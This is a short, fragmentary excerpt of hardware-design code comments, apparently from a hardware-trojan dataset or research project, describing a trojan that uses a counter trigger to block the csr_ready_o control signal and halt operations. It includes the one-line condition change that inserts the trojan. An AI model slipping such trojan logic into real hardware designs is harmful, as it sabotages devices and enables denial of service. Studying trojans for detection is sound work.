 ...
 * 
 * Description:
 *   Disables operations by blocking csr_ready_o control signal
 *   
 * Trigger: Counter on csr_ready_o
 * Payload: Block csr_ready_o when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block csr_ready_o when trojan is active
//
// IMPORTANT: csr_ready_o is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (csr_ready_o && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: csr_ready_o && 0 = 0 (always false)
//   All operations controlled by csr_ready_o are blocked
